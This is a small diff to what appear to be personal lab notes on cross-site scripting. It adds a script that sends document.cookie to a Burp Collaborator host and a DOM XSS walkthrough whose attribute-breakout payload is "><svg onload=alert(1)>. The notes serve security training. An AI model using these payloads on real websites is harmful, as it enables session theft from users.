@@ -1,4 +1,6 @@
-XSS - Steal cookies
+XSS
+
+Steal cookies w/burp collaborator
 
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
@@ -7,3 +9,10 @@ mode: 'no-cors',
 body:document.cookie
 });
 </script>
+
+DOM XSS in document.write sink using source location.search
+
+Right-click and inspect the element after searching for random string
+Observe that your random string has been placed inside an html attribute.
+Break out of the attribute by searching for: "><svg onload=alert(1)>
+
